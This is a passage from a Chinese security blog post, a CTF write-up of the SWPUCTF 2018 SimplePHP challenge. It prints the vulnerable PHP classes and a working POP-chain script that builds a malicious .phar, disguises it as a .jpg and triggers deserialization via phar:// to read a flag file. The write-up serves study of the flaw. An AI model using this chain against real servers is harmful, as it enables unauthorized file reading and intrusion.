class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 类C1e4r - 测试类，包含基本的构造和析构方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数，初始化str属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 析构函数，将str赋值给test并输出</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;  <span class="comment">// 可能触发其他类的__toString方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 类Show - 主要功能类，处理文件显示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;  <span class="comment">// 文件来源</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;     <span class="comment">// 字符串数据</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数，初始化source属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">// 可能设置为phar://协议路径</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;      <span class="comment">// 可能触发__toString</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对象被当作字符串使用时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;  <span class="comment">// 可能触发__get方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置不存在的属性时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示文件内容的核心方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 安全过滤：检查危险协议和路径</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;<span class="comment">//这里只是过滤了一部分，没有过滤我们想用的phar伪协议</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);  <span class="comment">// highlight_file(phar://upload/文件名)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 反序列化时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检查危险协议和路径</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;  <span class="comment">// 发现危险内容则重置为index.php</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 类Test - 文件操作类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;    <span class="comment">// 文件名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;  <span class="comment">// 参数数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数，初始化params数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 访问不存在的属性时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);  <span class="comment">// 调用get(&#x27;str&#x27;)方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取参数值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;  <span class="comment">// 默认值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);  <span class="comment">// 调用文件读取方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取文件内容并返回base64编码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));  <span class="comment">// 读取文件内容，可以用这个读取f1ag.php</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;!-- 安全审计要点 --&gt;</span><br><span class="line">    Test </span><br><span class="line">    <span class="title function_ invoke__">file_get</span>()-&gt;<span class="title function_ invoke__">get</span>()-&gt;<span class="title function_ invoke__">__get</span>()</span><br><span class="line">    Show</span><br><span class="line">    <span class="title function_ invoke__">__toString</span>()</span><br><span class="line">    C1e4r</span><br><span class="line">    <span class="title function_ invoke__">__destruct</span>()-&gt;<span class="title function_ invoke__">__construct</span>(<span class="variable">$name</span>)-&gt;name=<span class="keyword">new</span> <span class="title class_">Show</span></span><br></pre></td></tr></table></figure>

<p>接下来我们的思路就是构造pop链，来触发魔术方法，触发class.php里面的file_get_contents()来读取f1ag.php的文件内容</p>
<p>构造pop链，生成phar文件，通过上传文件接口进行文件上传</p>
<p>通过file.php&#x2F;?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;文件名，来使用phar伪协议触发反序列化，读取f1ag.php</p>
<p>文件名的获取</p>
<p><img src="/../image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ctf.assets/image-20250708160825844.png" alt="image-20250708160825844"></p>
<p>构造pop链，生成.phar文件，由于对上传文件名称做了白名单限制，所以生成的1.phar改名为1.jpg</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str=[<span class="string">&#x27;str&#x27;</span>=&gt;<span class="variable">$c</span>];</span><br><span class="line"><span class="variable">$c</span>-&gt;params=[<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>];<span class="comment">//这里我之前采用的路径是./f1ag.php一直不行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;1.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问&#x2F;upload目录，看文件名</p>
<table>
<thead>
<tr>
<th></th>
<th><a target="_blank" rel="noopener" href="http://8930569a-ceb2-4518-9c20-bd6401fc010e.node5.buuoj.cn/upload/8a3941bc090af632c1844d7254444bcc.jpg">8a3941bc090af632c1844d7254444bcc.jpg</a></th>
<th>2025-07-08 07:38</th>
<th>304</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8a3941bc090af632c1844d7254444bcc.jpg</span><br></pre></td></tr></table></figure>

<p>通过file.php&#x2F;?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;文件名，来使用phar伪协议触发反序列化，拿到flag</p>
<p><img src="/../image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ctf.assets/image-20250708154158388.png" alt="image-20250708154158388"></p>
<h3 id="Phar反序列化漏洞利用"><a href="#Phar反序列化漏洞利用" class="headerlink" title="Phar反序列化漏洞利用"></a><strong>Phar反序列化漏洞利用</strong></h3><p>既然很多函数可以触发phar反序列化，那么接下来就要实际利用该漏洞</p>
<p>Phar反序列化不会调用 <code>weakup </code>等方法</p>
<p>可以在不调用<code>unserialize()</code>的情况下进行反序列化操作。</p>
<p><strong>漏洞利用条件</strong></p>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">一个网安小兵Co0kieslover</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/10/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2025/10/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Co0kieslover</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">安全漏洞</a><a class="post-meta__tags" href="/tags/Phar/">Phar</a></div><div class="post-share"><div class="social-share" data-image="/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/d36357b9062eb3273d6f3f72477577d1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/25/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" title="vulnhub靶场HACKER KID:1.0.1"><img class="cover" src="/image/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">vulnhub靶场HACKER KID:1.0.1</div></div><div class="info-2"><div class="info-item-1">vulnhub靶场HACKER KID:1.0.1靶场下载地址https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova 复习知识点：xxe漏洞，dns解析，ssti漏洞 新知识点：cap_sys_ptrace+ep进程注入提权 信息收集扫描存活主机 1nmap -sn -T4 192.168.225.0/24   扫描靶机开放端口，确定开放服务 1nmap -sV 192.168.225.129   53 常用的 DNS服务器 80 常见web端口 9999 Tornado httpd 6.1 基于 Python 的高性能 Web 服务器框架 WEB服务： 爱看源码是个好习惯—-通过 URL 中的 GET 参数 page_no 来分页查看内容。还有一直说dig命令，它是用来查询域名的 get传参数选择页数。?page_no&#x3D;1  这里我选择爆破每一页，看看有什么有用的信息  发现了一些留下的信息，获得一个子域名hackers.blackhat.local  尝试使⽤dig挖掘域名信息 在 Kali 或其他渗...</div></div></div></a><a class="pagination-related" href="/2025/09/06/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">一个网安小兵Co0kieslover</div><div class="author-info-description">枯木逢春犹再发，人无两度再少年</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/co0kieslover" target="_blank" title="Github"><i class="fab fa-github" style="color: #333333;"></i></a><a class="social-icon" href="mailto:2847234228@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #000000;"></i></a><a class="social-icon" href="/img/hi.jpg" target="_blank" title="WeChat"><i class="fab fa-weixin" style="color: #07C160;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%EF%BC%8Cphar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.0.1.</span> <span class="toc-text">一，phar文件结构</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-a-stub"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">1. a stub</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-manifest"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">2.  manifest</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-the-file-contents"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">3. the file contents</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-signature"><span class="toc-number">1.0.1.4.</span> <span class="toc-text">4.  signature</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8Cdemo%E6%B5%8B%E8%AF%95"><span class="toc-number">1.0.2.</span> <span class="toc-text">二，demo测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%EF%BC%8C%E5%B0%86phar%E4%BC%AA%E9%80%A0%E6%88%90%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.3.</span> <span class="toc-text">三，将phar伪造成其他格式的文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%EF%BC%8C%E5%AE%9E%E6%88%98"><span class="toc-number">1.0.4.</span> <span class="toc-text">四，实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p1"><span class="toc-number">2.</span> <span class="toc-text">prize_p1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E7%A1%AE%E5%AE%9Aphar%E6%96%87%E4%BB%B6"><span class="toc-number">2.0.1.</span> <span class="toc-text">初步确定phar文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E6%89%93%E6%88%90%E5%8E%8B%E7%BC%A9%E5%8C%85%EF%BC%88%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%EF%BC%89"><span class="toc-number">2.0.2.</span> <span class="toc-text">phar文件打成压缩包（绕过正则）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E7%BB%84%E7%9B%B4%E6%8E%A5%E8%A7%A6%E5%8F%91GC%E6%9C%BA%E5%88%B6%EF%BC%8C%E7%BB%95%E8%BF%87%E5%BC%82%E5%B8%B8"><span class="toc-number">2.0.3.</span> <span class="toc-text">构造序列化数组直接触发GC机制，绕过异常</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%AD%BE%E5%90%8D"><span class="toc-number">2.0.4.</span> <span class="toc-text">修改签名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%EF%BC%8C%E4%B8%8A%E4%BC%A0%EF%BC%8C%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%8B%BFflag"><span class="toc-number">2.0.5.</span> <span class="toc-text">python脚本压缩文件，上传，读取，拿flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2018-SimplePHP"><span class="toc-number">2.1.</span> <span class="toc-text">[SWPUCTF 2018]SimplePHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">Phar反序列化漏洞利用</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/10/25/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" title="vulnhub靶场HACKER KID:1.0.1"><img src="/image/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub靶场HACKER KID:1.0.1"/></a><div class="content"><a class="title" href="/2025/10/25/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" title="vulnhub靶场HACKER KID:1.0.1">vulnhub靶场HACKER KID:1.0.1</a><time datetime="2025-10-25T15:40:23.000Z" title="发表于 2025-10-25 23:40:23">2025-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化"><img src="/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/d36357b9062eb3273d6f3f72477577d1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="phar反序列化"/></a><div class="content"><a class="title" href="/2025/10/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化">phar反序列化</a><time datetime="2025-10-22T13:06:57.000Z" title="发表于 2025-10-22 21:06:57">2025-10-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/06/hello-world/" title="Hello World">Hello World</a><time datetime="2025-09-06T08:29:40.702Z" title="发表于 2025-09-06 16:29:40">2025-09-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: #FDF5E6;"><div class="footer-other"><div class="footer-copyright"></div><div class="footer_custom_text">🌸 欢迎来到我的小站！<br>
👉 更多内容请关注 <a href="https://co0kieslover.github.io/" target="_blank">我的博客</a> ❤️<br>
© 2025 By Co0kieslover
</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="嗨,hi" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>